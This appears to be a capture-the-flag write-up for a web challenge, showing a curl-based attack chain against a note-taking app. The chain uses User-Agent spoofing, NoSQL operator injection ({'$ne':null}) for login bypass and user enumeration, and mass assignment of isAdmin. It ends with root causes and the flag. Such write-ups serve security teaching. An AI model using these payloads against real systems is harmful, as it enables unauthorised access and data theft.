# Challenge 1 — IndigoNotes (NoSQL Injection + Mass Assignment)

> [← Back to index](../../README.md) · **Category:** Web · **Flag:** `MPTC{mforst3r1ng_nosql_1nject10n_in_2026_05ad360526c}`

> *"A note-taking app, built in a few days. The boss insisted on PostgreSQL after the fact. The dev SWORE never to use SQL again. Say NO to SQL. IT'S ALREADY SECURED."*

The flavour text ("Say NO to SQL") is literal: the dev swapped PostgreSQL for a **NoSQL** database (MongoDB-style operators), which is injectable.

## Entry point

```bash
curl https://challenges.cncc-2026.xyz/26 -H "Authorization: <CTFd-API-key>"
# -> Your challenge URL is: http://boss-c11fb4f.cncc-2026.xyz
```

The app is a **SvelteKit** front-end with a JSON API.

## Step 1 — WAF / User-Agent bypass

The server blocks `curl`'s User-Agent:

```json
{"status":"kicked-out","message":"Using curl/8.10.1 is what hackers usually use ... GET OUT PEWWWWW!!!"}
```

Spoof a browser UA on every request:

```bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

## Step 2 — NoSQL authentication bypass

`POST /api/login` accepts JSON and passes it straight into a Mongo-style query. Operator injection bypasses the password check:

```bash
curl -s "$BASE/api/login" -H "User-Agent: $UA" -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
# {"success":true}   + Set-Cookie: token=<JWT>
```

The JWT decodes to user `janedoe` (`isAdmin:false`).

## Step 3 — Enumerate users with `$gt` / `$lt`

Comparison operators walk the user collection in order:

```bash
# next user alphabetically after janedoe
-d '{"username":{"$gt":"janedoe"},"password":{"$ne":null}}'   # notadmin
-d '{"username":{"$lt":"janedoe"},"password":{"$ne":null}}'   # dennieisdaneth
-d '{"username":{"$gt":"notadmin"},"password":{"$ne":null}}'  # systemhuh
```

| sub | username | isAdmin |
|-----|----------|---------|
| 1 | janedoe | false |
| 2 | notadmin | false |
| 3 | dennieisdaneth | false |
| 4 | systemhuh | false |

All non-admin — guessing won't help.

## Step 4 — Privilege escalation via Mass Assignment

`PATCH /api/profile` trusts the whole request body, so we set our own `isAdmin`:

```bash
curl -s "$BASE/api/profile" -H "User-Agent: $UA" -H "Cookie: token=$TOKEN" \
  -X PATCH -H "Content-Type: application/json" \
  -d '{"name":"Jane Doe","email":"jane.doe@indigonotes.io","isAdmin":true}'
# {"_id":1,..."isAdmin":true,...}
```

The DB record is now admin, but the existing JWT is stale — **re-login** to mint a fresh admin token:

```bash
-d '{"username":"janedoe","password":{"$ne":null}}'
# new JWT payload: {"sub":1,"username":"janedoe","isAdmin":true,...}
```

## Step 5 — Bypass the flag redaction with operator injection

`GET /api/users` (admin) lists users but redacts the flag-holder:

```json
{"_id":"<REDACTED_USER_EVEN_ADMIN_CANNOT_SEE>", ... "flag":"<REDACTED_USER_EVEN_ADMIN_CANNOT_SEE>"}
```

But `POST /api/users` (the search endpoint) passes the `q` value straight into the query and does **not** apply the redaction. Sending `q` as an **operator object** returns the raw record:

```bash
curl -s "$BASE/api/users" -H "User-Agent: $UA" -H "Cookie: token=$TOKEN" \
  -X POST -H "Content-Type: application/json" -d '{"q":{"$ne":null}}'
```

```json
{"_id":4,"username":"systemhuh", ... ,"flag":"MPTC{mforst3r1ng_nosql_1nject10n_in_2026_05ad360526c}"}
```

### Root causes
- Untyped JSON passed to a NoSQL query → operator injection (auth bypass + enumeration).
- `PATCH /api/profile` mass-assigns `isAdmin` (broken object-property-level authz).
- Output redaction applied on one code path (`GET`) but not the search path (`POST`).

## Files
- [`solve.sh`](solve.sh) — full chain (set `BASE` to the issued challenge URL)

**Flag:** `MPTC{mforst3r1ng_nosql_1nject10n_in_2026_05ad360526c}`
